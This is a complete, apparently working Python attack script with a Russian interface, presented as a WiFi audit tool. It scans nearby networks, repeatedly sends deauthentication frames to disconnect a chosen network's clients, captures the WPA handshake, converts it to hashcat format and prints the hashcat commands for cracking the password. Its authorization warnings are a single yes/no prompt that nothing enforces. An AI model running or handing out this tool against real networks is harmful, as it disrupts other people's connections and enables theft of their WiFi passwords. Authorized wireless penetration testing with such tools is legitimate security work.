#!/usr/bin/env python3
"""
WiFi Audit Tool — захват хендшейков и конвертация в hc22000
Только для авторизованного тестирования безопасности.
"""

import os
import sys
import subprocess
import time
import signal
import re
import glob
import shutil
import tempfile
from pathlib import Path
from datetime import datetime

# ─── Установка rich при первом запуске ────────────────────────────────────────
try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.progress import (
        Progress, SpinnerColumn, TextColumn,
        BarColumn, TimeElapsedColumn, TaskProgressColumn,
    )
    from rich.prompt import Prompt, IntPrompt, Confirm
    from rich.rule import Rule
    from rich.text import Text
    from rich.live import Live
    from rich.align import Align
except ImportError:
    import shutil as _shutil
    print("[*] Библиотека rich не найдена. Устанавливаем...")
    installed = False
    for mgr, args in [
        ("pacman",  ["pacman", "-S", "--noconfirm", "--needed", "python-rich"]),
        ("apt-get", ["apt-get", "install", "-y", "python3-rich"]),
        ("dnf",     ["dnf",     "install", "-y", "python3-rich"]),
    ]:
        if _shutil.which(mgr):
            ret = subprocess.run(args)
            installed = (ret.returncode == 0)
            break
    if not installed:
        # fallback: pip с --break-system-packages
        for pip_cmd in (["pip", "install", "--break-system-packages", "rich"],
                        [sys.executable, "-m", "pip", "install", "--break-system-packages", "rich"]):
            if subprocess.run(pip_cmd, capture_output=True).returncode == 0:
                installed = True
                break
    if not installed:
        print("Не удалось установить rich. Установите вручную: sudo pacman -S python-rich")
        sys.exit(1)
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.progress import (
        Progress, SpinnerColumn, TextColumn,
        BarColumn, TimeElapsedColumn, TaskProgressColumn,
    )
    from rich.prompt import Prompt, IntPrompt, Confirm
    from rich.rule import Rule
    from rich.text import Text
    from rich.live import Live
    from rich.align import Align

console = Console()

# ─── Баннер ───────────────────────────────────────────────────────────────────
BANNER = """[bold cyan]
 ██╗    ██╗██╗███████╗██╗      █████╗ ██╗   ██╗██████╗ ██╗████████╗
 ██║    ██║██║██╔════╝██║     ██╔══██╗██║   ██║██╔══██╗██║╚══██╔══╝
 ██║ █╗ ██║██║█████╗  ██║     ███████║██║   ██║██║  ██║██║   ██║
 ██║███╗██║██║██╔══╝  ██║     ██╔══██║██║   ██║██║  ██║██║   ██║
 ╚███╔███╔╝██║██║     ██║     ██║  ██║╚██████╔╝██████╔╝██║   ██║
  ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═╝   ╚═╝
[/bold cyan][bold yellow]
  ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗     ██╗   ██╗ ██╗
  ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗    ██║   ██║███║
  ███████║███████║██║     █████╔╝ █████╗  ██████╔╝    ██║   ██║╚██║
  ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗    ╚██╗ ██╔╝ ██║
  ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║     ╚████╔╝  ██║
  ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝      ╚═══╝   ╚═╝
[/bold yellow]"""

# ─── Пакетный менеджер → пакеты ───────────────────────────────────────────────
PKG_MAP = {
    "pacman":  {
        "aircrack-ng": "aircrack-ng",
        "hcxdumptool": "hcxdumptool",
        "hcxtools":    "hcxtools",
        "iw":          "iw",
    },
    "apt-get": {
        "aircrack-ng": "aircrack-ng",
        "hcxdumptool": "hcxdumptool",
        "hcxtools":    "hcxtools",
        "iw":          "iw",
    },
    "dnf": {
        "aircrack-ng": "aircrack-ng",
        "hcxdumptool": "hcxdumptool",
        "hcxtools":    "hcxtools",
        "iw":          "iw",
    },
}

# Команды, которые нужно проверить
REQUIRED = {
    "aircrack-ng":   ["aircrack-ng", "airodump-ng", "aireplay-ng", "airmon-ng"],
    "hcxdumptool":   ["hcxdumptool"],
    "hcxtools":      ["hcxpcapngtool"],
    "iw":            ["iw", "iwconfig"],
}


# ══════════════════════════════════════════════════════════════════════════════
#  УТИЛИТЫ
# ══════════════════════════════════════════════════════════════════════════════

def run(cmd: list, **kwargs) -> subprocess.CompletedProcess:
    return subprocess.run(cmd, capture_output=True, text=True, **kwargs)


def kill_proc(proc: subprocess.Popen):
    if proc and proc.poll() is None:
        proc.terminate()
        try:
            proc.wait(timeout=3)
        except subprocess.TimeoutExpired:
            proc.kill()


def signal_bar(dbm: int) -> str:
    """Визуальная полоска сигнала (rich-разметка)."""
    bars = 4
    if   dbm >= -50: filled, color = 4, "bright_green"
    elif dbm >= -60: filled, color = 3, "green"
    elif dbm >= -70: filled, color = 2, "yellow"
    elif dbm >= -80: filled, color = 1, "red"
    else:            filled, color = 0, "dim"
    bar = f"[{color}]" + "█" * filled + "[/]" + "[dim]" + "░" * (bars - filled) + "[/]"
    return f"{bar} [{color}]{dbm} dBm[/]"


def enc_style(enc: str) -> str:
    if "WPA3" in enc:  return f"[bold bright_green]{enc}[/]"
    if "WPA2" in enc:  return f"[green]{enc}[/]"
    if "WPA"  in enc:  return f"[yellow]{enc}[/]"
    if "WEP"  in enc:  return f"[red]{enc}[/]"
    return f"[dim]{enc}[/]"


# ══════════════════════════════════════════════════════════════════════════════
#  ШАГ 0 — ПРАВА ROOT
# ══════════════════════════════════════════════════════════════════════════════

def check_root():
    if os.geteuid() != 0:
        console.print(Panel(
            "[bold red]Скрипт требует прав root.[/bold red]\n"
            "Запустите: [bold cyan]sudo python3 wifi_audit.py[/bold cyan]",
            border_style="red",
        ))
        sys.exit(1)


# ══════════════════════════════════════════════════════════════════════════════
#  ШАГ 1 — ПРОВЕРКА И УСТАНОВКА ИНСТРУМЕНТОВ
# ══════════════════════════════════════════════════════════════════════════════

def detect_pkg_manager() -> str | None:
    for mgr in ("pacman", "apt-get", "dnf"):
        if shutil.which(mgr):
            return mgr
    return None


def check_and_install_tools():
    console.print(Rule("[bold blue]Проверка необходимых инструментов[/bold blue]"))

    missing_pkgs: list[str] = []

    table = Table(show_header=True, header_style="bold magenta", box=None)
    table.add_column("Пакет",    style="cyan",  min_width=16)
    table.add_column("Команды",  style="dim",   min_width=30)
    table.add_column("Статус",   min_width=16)

    for pkg, cmds in REQUIRED.items():
        absent = [c for c in cmds if not shutil.which(c)]
        if absent:
            table.add_row(pkg, ", ".join(cmds), "[red]✗ Отсутствует[/red]")
            missing_pkgs.append(pkg)
        else:
            table.add_row(pkg, ", ".join(cmds), "[bright_green]✓ Установлен[/bright_green]")

    console.print(table)

    if not missing_pkgs:
        console.print("[bright_green]Все инструменты на месте.[/bright_green]\n")
        return

    mgr = detect_pkg_manager()
    if not mgr:
        console.print("[red]Не удалось найти пакетный менеджер (pacman/apt-get/dnf).[/red]")
        sys.exit(1)

    pkg_names = [PKG_MAP[mgr].get(p, p) for p in missing_pkgs]
    console.print(f"\n[yellow]Будут установлены:[/yellow] {', '.join(pkg_names)}")

    if not Confirm.ask("[bold]Установить сейчас?[/bold]", default=True):
        console.print("[red]Невозможно продолжить без необходимых инструментов.[/red]")
        sys.exit(1)

    with Progress(SpinnerColumn(), TextColumn("{task.description}"), console=console) as p:
        tid = p.add_task("Установка...", total=None)

        if mgr == "pacman":
            install_cmd = ["pacman", "-S", "--noconfirm", "--needed"] + pkg_names
        elif mgr == "apt-get":
            run(["apt-get", "update", "-qq"])
            install_cmd = ["apt-get", "install", "-y"] + pkg_names
        else:
            install_cmd = ["dnf", "install", "-y"] + pkg_names

        res = run(install_cmd)
        p.update(tid, description="Готово")

    if res.returncode != 0:
        console.print(f"[red]Ошибка установки:\n{res.stderr}[/red]")
        sys.exit(1)

    console.print("[bright_green]Инструменты успешно установлены.[/bright_green]\n")


# ══════════════════════════════════════════════════════════════════════════════
#  ШАГ 2 — СПИСОК WiFi АДАПТЕРОВ
# ══════════════════════════════════════════════════════════════════════════════

def get_wifi_adapters() -> list[dict]:
    """Возвращает список беспроводных интерфейсов через iw dev."""
    result = run(["iw", "dev"])
    adapters: list[dict] = []

    current: dict = {}
    for line in result.stdout.splitlines():
        m_iface = re.search(r"Interface\s+(\S+)", line)
        m_type  = re.search(r"type\s+(\S+)", line)
        m_addr  = re.search(r"addr\s+([0-9a-fA-F:]{17})", line)
        m_phy   = re.search(r"phy#(\d+)", line)

        if m_phy:
            if current.get("name"):
                adapters.append(current)
            current = {"phy": m_phy.group(1), "name": "", "mode": "managed", "mac": "N/A"}
        elif m_iface:
            current["name"] = m_iface.group(1)
        elif m_type:
            current["mode"] = m_type.group(1)
        elif m_addr:
            current["mac"] = m_addr.group(1)

    if current.get("name"):
        adapters.append(current)

    # Фильтр: только реальные WiFi (поддержка беспроводного расширения)
    wifi = []
    for a in adapters:
        r = run(["iwconfig", a["name"]])
        if "no wireless extensions" not in (r.stderr + r.stdout):
            wifi.append(a)

    return wifi


def show_adapters(adapters: list[dict]):
    console.print(Rule("[bold blue]Доступные WiFi адаптеры[/bold blue]"))
    t = Table(show_header=True, header_style="bold magenta", box=None)
    t.add_column("#",         style="cyan",  width=4)
    t.add_column("Интерфейс", style="bright_green", min_width=12)
    t.add_column("Режим",     style="yellow", min_width=12)
    t.add_column("MAC адрес", style="blue",   min_width=18)
    t.add_column("PHY",       style="dim",    min_width=6)

    for i, a in enumerate(adapters, 1):
        mode = a["mode"]
        color = "bright_green" if mode == "monitor" else "yellow"
        t.add_row(str(i), a["name"], f"[{color}]{mode}[/]", a["mac"], f"phy{a['phy']}")

    console.print(t)


# ══════════════════════════════════════════════════════════════════════════════
#  ШАГ 3 — РЕЖИМ МОНИТОРИНГА
# ══════════════════════════════════════════════════════════════════════════════

def enable_monitor_mode(iface: str) -> str:
    console.print(f"\n[yellow]Перевод [bold]{iface}[/bold] в режим мониторинга...[/yellow]")

    with Progress(SpinnerColumn(), TextColumn("{task.description}"), console=console) as p:
        tid = p.add_task("Завершение мешающих процессов...", total=None)
        run(["airmon-ng", "check", "kill"])
        time.sleep(0.5)

        p.update(tid, description=f"Запуск monitor mode на {iface}...")
        res = run(["airmon-ng", "start", iface])
        time.sleep(1)

        p.update(tid, description="Определение нового имени интерфейса...")

    # Определяем новое имя (wlan0mon, wlan0, и т.д.)
    iw_out = run(["iw", "dev"]).stdout
    monitor_iface = None
    cur_iface = None
    for line in iw_out.splitlines():
        m = re.search(r"Interface\s+(\S+)", line)
        if m:
            cur_iface = m.group(1)
        if re.search(r"type\s+monitor", line) and cur_iface:
            if iface.replace("mon", "") in cur_iface or cur_iface == iface:
                monitor_iface = cur_iface
                break

    if not monitor_iface:
        for candidate in (iface + "mon", iface):
            r = run(["iwconfig", candidate])
            if "Monitor" in r.stdout:
                monitor_iface = candidate
                break

    if not monitor_iface:
        monitor_iface = iface

    console.print(f"[bright_green]Режим мониторинга активен:[/bright_green] [bold]{monitor_iface}[/bold]\n")
    return monitor_iface


# ══════════════════════════════════════════════════════════════════════════════
#  ШАГ 4 — СКАНИРОВАНИЕ СЕТЕЙ
# ══════════════════════════════════════════════════════════════════════════════

def _parse_airodump_csv(csv_path: str) -> list[dict]:
    """Парсинг CSV от airodump-ng. Секция AP заканчивается первой пустой строкой."""
    networks: list[dict] = []
    try:
        with open(csv_path, encoding="utf-8", errors="ignore") as f:
            content = f.read()
    except OSError:
        return networks

    # Отделяем блок точек доступа от блока клиентов
    ap_block = re.split(r"\r?\n\r?\n", content)[0]
    lines = ap_block.splitlines()

    for line in lines[2:]:  # первые две — заголовки
        cols = [c.strip() for c in line.split(",")]
        if len(cols) < 14:
            continue
        bssid = cols[0]
        if not re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", bssid):
            continue
        try:
            power    = int(cols[8]) if cols[8] else -100
            channel  = cols[3] or "?"
            enc      = cols[5] or "?"
            cipher   = cols[6] or "?"
            auth     = cols[7] or "?"
            essid    = cols[13] if cols[13] else "<Скрытая>"
        except (ValueError, IndexError):
            continue
        networks.append({
            "bssid":   bssid,
            "power":   power,
            "channel": channel,
            "enc":     enc,
            "cipher":  cipher,
            "auth":    auth,
            "essid":   essid,
        })

    networks.sort(key=lambda x: x["power"], reverse=True)
    return networks


def scan_networks(monitor_iface: str, scan_sec: int = 15) -> list[dict]:
    console.print(f"[yellow]Сканирование на [bold]{monitor_iface}[/bold]...[/yellow]")

    tmpdir = tempfile.mkdtemp(prefix="wifi_scan_")
    prefix = os.path.join(tmpdir, "scan")

    proc = subprocess.Popen(
        ["airodump-ng", "--output-format", "csv", "-w", prefix, monitor_iface],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )

    with Progress(
        SpinnerColumn(),
        TextColumn("[cyan]{task.description}[/cyan]"),
        BarColumn(bar_width=40),
        TaskProgressColumn(),
        TimeElapsedColumn(),
        console=console,
    ) as prog:
        tid = prog.add_task(f"Сканирование сетей", total=scan_sec)
        for _ in range(scan_sec):
            time.sleep(1)
            prog.advance(tid)

    kill_proc(proc)
    time.sleep(0.5)

    csv_files = glob.glob(prefix + "*.csv")
    networks  = _parse_airodump_csv(csv_files[0]) if csv_files else []

    shutil.rmtree(tmpdir, ignore_errors=True)
    return networks


def show_networks(networks: list[dict]):
    console.print(Rule("[bold blue]Обнаруженные сети[/bold blue]"))

    t = Table(show_header=True, header_style="bold magenta")
    t.add_column("#",           style="cyan",  width=4)
    t.add_column("BSSID",       style="blue",  min_width=18)
    t.add_column("ESSID",       style="bright_white", min_width=24)
    t.add_column("Канал",       style="yellow", width=7)
    t.add_column("Сигнал",      min_width=22)
    t.add_column("Шифрование",  min_width=12)
    t.add_column("Шифр/Auth",   style="dim",   min_width=14)

    for i, n in enumerate(networks, 1):
        t.add_row(
            str(i),
            n["bssid"],
            n["essid"][:23],
            n["channel"],
            signal_bar(n["power"]),
            enc_style(n["enc"]),
            f"{n['cipher']} / {n['auth']}",
        )

    console.print(t)


# ══════════════════════════════════════════════════════════════════════════════
#  ШАГ 5 — ДЕАУТЕНТИФИКАЦИЯ + ЗАХВАТ ХЕНДШЕЙКА
# ══════════════════════════════════════════════════════════════════════════════

def _handshake_present(cap_file: str, bssid: str) -> bool:
    """Проверка хендшейка через aircrack-ng."""
    if not os.path.exists(cap_file):
        return False
    r = run(["aircrack-ng", "-b", bssid, cap_file])
    return bool(re.search(r"1 handshake|handshake", r.stdout, re.I))


def capture_handshake(
    monitor_iface: str,
    target: dict,
    capture_sec: int = 60,
    output_dir: str = ".",
) -> tuple[str, bool]:
    bssid   = target["bssid"]
    channel = target["channel"]
    essid   = target["essid"]

    out_dir  = Path(output_dir)
    out_dir.mkdir(parents=True, exist_ok=True)
    ts       = datetime.now().strftime("%Y%m%d_%H%M%S")
    cap_pfx  = str(out_dir / f"hs_{ts}")
    cap_file = cap_pfx + "-01.cap"

    console.print(Panel(
        f"[bold]Цель:[/bold]      [bright_green]{essid}[/bright_green]\n"
        f"[bold]BSSID:[/bold]     [blue]{bssid}[/blue]\n"
        f"[bold]Канал:[/bold]     [yellow]{channel}[/yellow]\n"
        f"[bold]Файл:[/bold]      [dim]{cap_file}[/dim]",
        title="[bold yellow]Параметры захвата[/bold yellow]",
        border_style="yellow",
    ))

    # Устанавливаем канал
    run(["iwconfig", monitor_iface, "channel", channel])

    # Запускаем airodump-ng (захват)
    dump_proc = subprocess.Popen(
        ["airodump-ng",
         "-c", channel,
         "--bssid", bssid,
         "-w", cap_pfx,
         "--output-format", "pcap",
         monitor_iface],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )

    time.sleep(2)  # дать airodump-ng раскрутиться

    handshake_ok = False
    deauth_interval = 10  # каждые N секунд — повторная деаутентификация

    def send_deauth():
        subprocess.Popen(
            ["aireplay-ng", "--deauth", "10", "-a", bssid, monitor_iface],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )

    console.print("[bold red]Деаутентификация клиентов...[/bold red]")
    send_deauth()

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(bar_width=40),
        TaskProgressColumn(),
        TimeElapsedColumn(),
        console=console,
    ) as prog:
        tid = prog.add_task("Ожидание хендшейка...", total=capture_sec)

        for elapsed in range(1, capture_sec + 1):
            time.sleep(1)
            prog.advance(tid)

            if elapsed % deauth_interval == 0:
                send_deauth()
                prog.update(tid, description="[yellow]Повторная деаутентификация...[/yellow]")
                time.sleep(0.5)

            if elapsed % 5 == 0:
                if _handshake_present(cap_file, bssid):
                    handshake_ok = True
                    prog.update(tid, description="[bright_green]Хендшейк захвачен! ✓[/bright_green]")
                    prog.update(tid, completed=capture_sec)
                    break
                else:
                    prog.update(tid, description="Ожидание хендшейка...")

    kill_proc(dump_proc)
    time.sleep(0.5)

    # Финальная проверка
    if not handshake_ok:
        handshake_ok = _handshake_present(cap_file, bssid)

    return cap_file, handshake_ok


# ══════════════════════════════════════════════════════════════════════════════
#  ШАГ 6 — КОНВЕРТАЦИЯ В hc22000
# ══════════════════════════════════════════════════════════════════════════════

def convert_to_hc22000(cap_file: str, output_dir: str = ".") -> str | None:
    stem       = Path(cap_file).stem
    out_file   = str(Path(output_dir) / f"{stem}.hc22000")

    console.print(f"\n[cyan]Конвертация [dim]{cap_file}[/dim] → hc22000...[/cyan]")

    # hcxpcapngtool (современное название) или hcxpcaptool (старое)
    tool = "hcxpcapngtool" if shutil.which("hcxpcapngtool") else "hcxpcaptool"

    with Progress(SpinnerColumn(), TextColumn("{task.description}"), console=console) as p:
        tid = p.add_task("Конвертация...", total=None)
        res = run([tool, "-o", out_file, cap_file])
        p.update(tid, description="Готово")

    if res.returncode != 0 or not os.path.exists(out_file):
        console.print(f"[red]Ошибка конвертации:[/red]\n{res.stderr or res.stdout}")
        return None

    if os.path.getsize(out_file) == 0:
        console.print("[red]Файл hc22000 пуст — хендшейк не был захвачен.[/red]")
        return None

    return out_file


# ══════════════════════════════════════════════════════════════════════════════
#  ШАГ 7 — ОТОБРАЖЕНИЕ ХЭША
# ══════════════════════════════════════════════════════════════════════════════

def display_hash(hash_file: str, save_dir: str = "."):
    try:
        with open(hash_file) as f:
            lines = [l.strip() for l in f if l.strip()]
    except OSError:
        console.print("[red]Не удалось прочитать файл хэша.[/red]")
        return

    console.print(Rule("[bold bright_green]Результат — хэши hc22000[/bold bright_green]"))

    for i, h in enumerate(lines, 1):
        console.print(Panel(
            f"[bold bright_green]{h}[/bold bright_green]",
            title=f"[bold]Хэш #{i}[/bold]",
            border_style="bright_green",
            padding=(0, 2),
        ))

    # Сохраняем копию в рабочую директорию
    ts        = datetime.now().strftime("%Y%m%d_%H%M%S")
    save_path = Path(save_dir) / f"handshake_{ts}.hc22000"
    shutil.copy(hash_file, save_path)

    console.print(Panel(
        f"[bold]Файл сохранён:[/bold] [cyan]{save_path}[/cyan]\n\n"
        f"[dim]Для подбора пароля:[/dim]\n"
        f"[bold cyan]hashcat -m 22000 {save_path} wordlist.txt[/bold cyan]\n\n"
        f"[dim]С правилами:[/dim]\n"
        f"[cyan]hashcat -m 22000 {save_path} wordlist.txt -r /usr/share/hashcat/rules/best64.rule[/cyan]",
        title="[bold]Следующий шаг[/bold]",
        border_style="blue",
    ))


# ══════════════════════════════════════════════════════════════════════════════
#  ВОССТАНОВЛЕНИЕ ИНТЕРФЕЙСА
# ══════════════════════════════════════════════════════════════════════════════

def restore_interface(original: str, monitor: str):
    console.print(f"\n[yellow]Восстановление интерфейса [bold]{original}[/bold]...[/yellow]")
    run(["airmon-ng", "stop", monitor])
    for svc in ("NetworkManager", "wpa_supplicant"):
        run(["systemctl", "start", svc])
    console.print("[bright_green]Интерфейс восстановлен.[/bright_green]")


# ══════════════════════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════════════════════

def main():
    console.print(BANNER)

    console.print(Panel(
        "[bold yellow]ПРЕДУПРЕЖДЕНИЕ:[/bold yellow] Этот инструмент предназначен "
        "[bold]ИСКЛЮЧИТЕЛЬНО[/bold] для авторизованного тестирования безопасности.\n\n"
        "Несанкционированный перехват сетевого трафика является [bold red]уголовно наказуемым[/bold red] "
        "деянием во многих странах.\n\n"
        "Используйте только в сетях, на которые у вас есть [bold]письменное разрешение[/bold].",
        title="[bold red]⚠  ОТКАЗ ОТ ОТВЕТСТВЕННОСТИ[/bold red]",
        border_style="red",
    ))

    if not Confirm.ask("\n[bold yellow]Подтверждаю, что имею разрешение на тестирование целевой сети[/bold yellow]", default=False):
        console.print("[red]Выход.[/red]")
        sys.exit(0)

    # ── Права root ────────────────────────────────────────────────────────────
    check_root()

    # ── Инструменты ───────────────────────────────────────────────────────────
    check_and_install_tools()

    # ── Адаптеры ──────────────────────────────────────────────────────────────
    adapters = get_wifi_adapters()
    if not adapters:
        console.print("[red]WiFi адаптеры не найдены. Убедитесь, что адаптер подключён.[/red]")
        sys.exit(1)

    show_adapters(adapters)

    idx = IntPrompt.ask("\n[bold]Выберите номер адаптера[/bold]", default=1)
    if not 1 <= idx <= len(adapters):
        console.print("[red]Неверный номер.[/red]")
        sys.exit(1)

    selected       = adapters[idx - 1]
    orig_iface     = selected["name"]
    monitor_iface  = None

    console.print(f"\n[bright_green]Выбран:[/bright_green] [bold]{orig_iface}[/bold]")

    # ── Monitor mode ──────────────────────────────────────────────────────────
    monitor_iface = enable_monitor_mode(orig_iface)

    try:
        # ── Сканирование ──────────────────────────────────────────────────────
        scan_sec = IntPrompt.ask("[bold]Время сканирования (секунд)[/bold]", default=15)
        networks = scan_networks(monitor_iface, scan_sec)

        if not networks:
            console.print("[red]Сети не обнаружены. Попробуйте увеличить время сканирования.[/red]")
            return

        show_networks(networks)

        # ── Выбор цели ────────────────────────────────────────────────────────
        tidx = IntPrompt.ask("\n[bold]Выберите номер цели[/bold]", default=1)
        if not 1 <= tidx <= len(networks):
            console.print("[red]Неверный номер.[/red]")
            return

        target = networks[tidx - 1]
        console.print(
            f"\n[bright_green]Цель выбрана:[/bright_green] "
            f"[bold]{target['essid']}[/bold]  "
            f"[dim]{target['bssid']}[/dim]"
        )

        # ── Параметры захвата ─────────────────────────────────────────────────
        cap_sec  = IntPrompt.ask("[bold]Максимальное время захвата (секунд)[/bold]", default=60)
        out_dir  = Prompt.ask("[bold]Директория для сохранения[/bold]", default=str(Path.cwd()))

        # ── Захват ────────────────────────────────────────────────────────────
        cap_file, ok = capture_handshake(monitor_iface, target, cap_sec, out_dir)

        if ok:
            console.print("\n[bold bright_green]✓ Хендшейк успешно захвачен![/bold bright_green]")
        else:
            console.print("\n[yellow]Хендшейк может быть неполным. Пробуем конвертировать...[/yellow]")

        # ── Конвертация ───────────────────────────────────────────────────────
        if os.path.exists(cap_file):
            h_file = convert_to_hc22000(cap_file, out_dir)
            if h_file:
                display_hash(h_file, out_dir)
            else:
                console.print(
                    f"[yellow]Файл .cap сохранён:[/yellow] [dim]{cap_file}[/dim]\n"
                    "[dim]Попробуйте позже: hcxpcapngtool -o out.hc22000 <файл.cap>[/dim]"
                )
        else:
            console.print("[red]Файл захвата не найден.[/red]")

    except KeyboardInterrupt:
        console.print("\n[yellow]Прервано пользователем.[/yellow]")

    finally:
        if monitor_iface:
            if Confirm.ask(
                "\n[bold]Восстановить интерфейс в управляемый режим?[/bold]",
                default=True,
            ):
                restore_interface(orig_iface, monitor_iface)

    console.print("\n[bold bright_green]Работа завершена.[/bold bright_green]")


if __name__ == "__main__":
    main()
